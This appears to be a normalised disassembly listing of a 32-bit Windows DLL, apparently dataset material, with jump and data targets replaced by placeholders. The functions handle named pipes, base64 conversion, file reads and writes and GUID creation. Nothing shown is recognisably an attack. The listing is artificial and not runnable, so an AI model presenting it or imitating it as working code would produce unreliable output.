mov [ ebp - 0x4 ] 0x1
cmp eax edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push edi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] edi
call sub_100164ff
push edi
push edi
push ebx
call sub_10001a27
add esp 0xc
mov eax ebx
call sub_100282db
retn
mov edx [ ebp - 0x10 ]
push eax
call sub_100163be
mov edi eax
sub_100164ff
push 0x4
mov eax sub_1004ca34
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10016561
push ebp
sub esp 0x4c
push 0x8c
mov eax sub_1004f1c3
call sub_10028203
mov esi ecx
xor ebx ebx
mov ecx edi
mov [ ebp + 0x44 ] edi
mov [ ebp + 0x4c ] ebx
call sub_10003d21
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x18 ] 0x8
mov [ ebp + 0x4c ] 0x1
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea esi [ ebp - 0x98 ]
call sub_10011312
lea esi [ ebp + 0x2c ]
lea eax [ ebp - 0x98 ]
call sub_10011388
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
lea ebx [ ebp - 0x98 ]
mov [ ebp + 0x48 ] esp
call sub_1001128b
push 0x0
push esi
mov ecx edi
call sub_1000957d
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp + 0x28 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
push esi
lea eax [ ebp - 0x98 ]
push eax
call sub_100100dd
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x44 ] ebx
jne r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x0
call sub_1000fa8d
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x50
leave
retn
push r--data
lea ecx [ ebp + 0x28 ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_10009cec
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x4 ]
test [ ebp + eax - 0x90 ] 0x6
je r-xdata
lea eax [ ebp + 0x28 ]
push eax
lea ecx [ ebp ]
call sub_10002075
push r--data
lea eax [ ebp ]
push eax
call sub_10027dd1
sub_10016690
push 0xd0
mov eax sub_1004f171
call sub_10028203
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0xdc ]
push eax
push 0x20
pop ecx
call sub_1001088b
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xdc ]
call sub_1000fb74
call sub_100282db
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
push eax
push esi
lea eax [ ebp - 0xdc ]
push eax
call sub_100095cf
lea esi [ ebp - 0xdc ]
call sub_1000538a
mov eax [ ebp - 0xdc ]
mov eax [ eax + 0x4 ]
test [ ebp + eax - 0xd4 ] 0x6
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_1001675f
push esi
lea esi [ ecx + 0x4 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ esi ]
call [ CloseHandle@IAT ]
sub_10016780
push 0x4c
mov eax sub_1004dee6
call sub_10028203
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x18 ] esi
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x14 ] esi
jb r-xdata
add eax 0x4
mov [ ebp - 0x10 ] eax
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
push [ ebp - 0x14 ]
mov esi eax
call sub_10014fe2
jmp r-xdata
push esi
push esi
lea edx [ ebp - 0x14 ]
push edx
push esi
xor ebx ebx
inc ebx
push ebx
push ecx
push eax
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov edi eax
call sub_10001c7f
lea eax [ ebp - 0x38 ]
push eax
cmp edi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_10014ddd
pop ecx
pop ecx
push esi
push ebx
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x0
call sub_10002020
push 0x20
call sub_10024389
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax esi
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov edi eax
call sub_10003257
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax esi
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov [ ebp - 0x18 ] ebx
jb r-xdata
push edi
push edi
lea esi [ ebp - 0x14 ]
push esi
push eax
push ebx
push edx
push ecx
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x54 ]
mov esi eax
call sub_10001c7f
lea eax [ ebp - 0x54 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10014ddd
pop ecx
pop ecx
push edi
push ebx
lea ecx [ ebp - 0x54 ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
mov ecx [ ecx ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
cmp [ ecx + 0x18 ] 0x10
mov ecx [ ebp - 0x10 ]
jb r-xdata
sub_100168a4
push 0x68
mov eax sub_1004de8e
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
xor edx edx
cmp [ esi + 0x1c ] 0x10
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] edx
jb r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp [ esi + 0x1c ] 0x10
mov eax [ esi + 0x18 ]
jb r-xdata
lea ecx [ ebp - 0x28 ]
lea edi [ ebp - 0x30 ]
push edi
mov edi [ CryptBinaryToStringA@IAT ]
push edx
xor ebx ebx
inc ebx
push ebx
push eax
push ecx
call edi
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] ebx
lea eax [ ebp - 0x54 ]
push eax
setne al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x54 ]
call sub_10002020
push 0x0
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
call sub_100079fe
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
dec ecx
push ecx
mov ecx [ ebp - 0x38 ]
push eax
call sub_100026d3
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x38 ]
call sub_100282ef
retn
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0x30 ]
push edx
push ecx
push ebx
push eax
push esi
call edi
push r--data
lea ecx [ ebp - 0x70 ]
mov esi eax
call sub_10001c7f
lea eax [ ebp - 0x70 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] bl
call sub_10002020
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
sub_100169b6
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push 0x1
push eax
call [ WaitNamedPipeW@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
xor al al
jmp r-xdata
cmp eax 0x79
jne r-xdata
call sub_100282db
retn
sub_10016a31
push 0x38
mov eax sub_1004e099
call sub_10028203
mov eax [ ebp + 0xc ]
xor edi edi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] edi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_10016d92
push esi
push esi
push edi
call sub_10001a27
add esp 0xc
mov eax edi
call sub_100282db
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ CreateNamedPipeW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_10002020
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001c7f
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x44 ]
call sub_10002020
push 0x8
call sub_10024389
pop ecx
cmp eax esi
je r-xdata
sub_10016b16
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0x0
push eax
call [ ConnectNamedPipe@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call [ GetLastError@IAT ]
cmp eax 0x217
je r-xdata
call sub_100282db
retn 0x4
sub_10016b7f
push 0x4
mov eax sub_1004e6f6
call sub_10028203
mov edi ecx
and [ ebp - 0x10 ] 0x0
push 0x8
call sub_10024389
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_10016d92
push esi
push esi
push ebx
call sub_10001a27
add esp 0xc
mov eax ebx
call sub_100282db
retn
push edi
call sub_10016def
mov [ esi ] r--data
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
jmp r-xdata
sub_10016bf0
push 0xc
mov eax sub_1004e6d1
call sub_10028203
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_1000136c
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax 0x200
lea esi [ edi + 0x3c ]
mov [ edi + 0x20 ] 0x3
mov [ edi + 0x24 ] ebx
mov [ edi + 0x28 ] 0xff
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] ebx
mov [ edi + 0x38 ] ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_10016d5f
mov [ ebp - 0x4 ] 0x2
call sub_10011f26
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
je r-xdata
mov eax edi
call sub_100282db
retn 0x8
call sub_10003d5c
sub_10016c8d
push 0x4
mov eax sub_1004cbd7
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x40 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_10001500
call sub_100282db
retn
call sub_10003d5c
sub_10016cc6
push 0xc
mov eax sub_1004e698
call sub_10028203
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
add ebx 0x3c
mov eax [ ebx ]
mov [ edi ] eax
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_10003d36
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ edi ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
push [ edi ]
call sub_10016b16
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10016d5f
mov esi ebx
mov [ ebp - 0x4 ] 0x2
call sub_10011f26
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10016d5f
mov [ ebp - 0x4 ] esi
mov esi edi
call sub_10011f26
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax edi
call sub_100282db
retn 0x8
call sub_10003d5c
call sub_10003d5c
sub_10016d5f
push ebp
mov ebp esp
push ecx
push [ eax + 0x38 ]
and [ ebp - 0x4 ] 0x0
push [ eax + 0x34 ]
add eax 0x4
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ eax + 0x24 ]
push [ eax + 0x20 ]
push [ eax + 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_10016a31
mov eax [ ebp + 0x8 ]
add esp 0x24
leave
retn 0x4
sub_10016d92
push 0x4
mov eax sub_1004ca19
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10016def
push 0x40
mov eax sub_1004e0f7
call sub_10028203
xor edi edi
push edi
push edi
push 0x3
push edi
push edi
push 0x3
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] eax
call sub_10001c7f
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x2c ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
lea ecx [ ebp - 0x48 ]
call sub_10001c7f
cmp [ ebp - 0x10 ] 0xffffffff
lea eax [ ebp - 0x48 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014ddd
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x10 ]
call sub_100282db
retn
sub_10016e80
push 0x64
mov eax sub_1004e654
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ WriteFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_100282db
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001c7f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10027dd1
sub_10016f1c
push 0x64
mov eax sub_1004e628
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ ReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_100282db
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001c7f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10027dd1
sub_10016fb8
push 0xa0
mov eax sub_1004d2a2
call sub_1002826c
xor esi esi
push esi
push esi
call [ CoInitializeEx@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
je r-xdata
push 0x10
lea eax [ ebp - 0x24 ]
push esi
push eax
mov [ ebp - 0x4 ] ecx
call sub_10024b80
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call [ CoCreateGuid@IAT ]
cmp eax esi
je r-xdata
cmp eax 0x80010106
je r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call [ CoUninitialize@IAT ]
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001c7f
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x2
call sub_10002075
push r--data
lea eax [ ebp - 0xac ]
jmp r-xdata
cmp eax esi
je r-xdata
push eax
call sub_10027dd1
push r--data
lea ecx [ ebp - 0x5c ]
call sub_10001c7f
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] esi
call sub_10002075
push r--data
lea eax [ ebp - 0x84 ]
sub_10017079
push 0x20
mov eax sub_1004e168
call sub_10028203
push ebx
push [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
call sub_100170ce
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
mov ecx esi
call sub_10002075
push 0x0
push 0x1
mov ecx edi
mov [ esi ] r--data
call sub_10002020
mov [ esi ] r--data
mov [ esi + 0x28 ] ebx
mov eax esi
call sub_100282db
retn 0x4
sub_100170ce
push 0xd4
mov eax sub_1004db04
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp + 0xc ]
xor esi esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] esi
call sub_1001727f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x2c ]
call sub_100171e5
pop ecx
push [ ebp - 0x4c ]
xor ebx ebx
lea eax [ ebp - 0xdc ]
inc ebx
push eax
mov [ ebp - 0x4 ] bl
call sub_100172b5
push r--data
push eax
lea eax [ ebp - 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001797d
add esp 0x14
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10017302
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1001797d
add esp 0xc
lea ecx [ ebp - 0x2c ]
push ecx
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10017302
add esp 0xc
push r--data
push eax
push edi
mov [ ebp - 0x4 ] 0x6
call sub_1001797d
add esp 0xc
push esi
push ebx
lea ecx [ ebp - 0x6c ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0xc0 ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0x88 ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0xa4 ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0xdc ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax edi
call sub_100282ef
retn
sub_100171e5
push 0x28
mov eax sub_1004d272
call sub_10028203
xor esi esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
push esi
mov edi ecx
mov [ ebp - 0x18 ] esi
push 0x1300
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] esi
call [ FormatMessageA@IAT ]
mov ebx eax
cmp ebx 0x4
jbe r-xdata
push r--data
mov ecx edi
call sub_10001c7f
xor edi edi
mov [ ebp - 0x4 ] esi
inc edi
mov [ ebp - 0x18 ] edi
cmp [ ebp - 0x10 ] esi
je r-xdata
sub ebx 0x3
mov eax [ ebp - 0x14 ]
call sub_100282db
retn
cmp ebx esi
jbe r-xdata
cmp [ ebp - 0x10 ] esi
je r-xdata
push ebx
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x34 ]
call sub_100026d3
push 0xffffffff
push esi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0x14 ]
push eax
call sub_10001f30
push esi
push edi
lea ecx [ ebp - 0x34 ]
call sub_10002020
push [ ebp - 0x10 ]
call [ LocalFree@IAT ]
sub_1001727f
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1c ] 0x0
push edi
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
mov edi ecx
call sub_1001734d
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
pop edi
call sub_100242d7
leave
retn
sub_100172b5
push 0x20
mov eax sub_1004d236
call sub_10028203
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0xc ]
mov ecx eax
call sub_100086af
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001fc2
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_10017302
push 0x20
mov eax sub_1004d236
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001fc2
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_100086af
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001fc2
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_1001734d
push 0xc
mov eax sub_1004daa5
call sub_10028203
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
mov ecx edi
mov [ ebp - 0x14 ] edi
lea esi [ eax + 0x13 ]
call sub_10003d21
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_10017396
pop ecx
push [ ebp - 0x14 ]
push esi
push eax
push edi
call sub_10017468
mov eax edi
call sub_100282db
retn
sub_10017396
push 0x30
mov eax sub_1004da67
call sub_1002826c
mov esi ecx
lea ecx [ ebp - 0x34 ]
call sub_10003a7e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_1000c26d
mov edi eax
pop ecx
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_1000c088
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d ] 0x0
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x2d ] al
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_10013f73
mov bl [ eax ]
mov bl 0x7f
jmp r-xdata
and [ ebp - 0x38 ] 0x0
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_10013f73
cmp [ eax ] 0x0
jg r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
push 0xa
pop edi
div edi
dec cl
dec esi
add dl 0x30
mov [ esi ] dl
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x38 ]
inc edi
mov [ ebp - 0x38 ] edi
cmp edi [ ebp - 0x3c ]
jae r-xdata
mov cl bl
test cl cl
jne r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
lea ecx [ ebp - 0x34 ]
call sub_10003c49
mov eax esi
call sub_100282ef
retn
mov al [ ebp - 0x2d ]
dec esi
mov cl bl
mov [ esi ] al
lea eax [ ebp - 0x2c ]
call sub_10013f73
mov al [ eax ]
mov bl 0x7f
test al al
jle r-xdata
mov bl al
sub_10017468
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
sub esp 0x10
push esi
push edi
lea eax [ esp + 0x8 ]
push eax
call sub_1001793b
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
call sub_10010e6d
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push edi
push esi
push [ eax + 0x4 ]
push [ eax ]
call sub_100174af
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_100174af
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push [ esp + 0x4 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100174d8
mov esp ebp
pop ebp
retn 0x18
sub_100174d8
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cd80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov esi ecx
push eax
lea ecx [ esp + 0x14 ]
call sub_100175bf
and [ esp + 0x38 ] 0x0
lea eax [ esp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
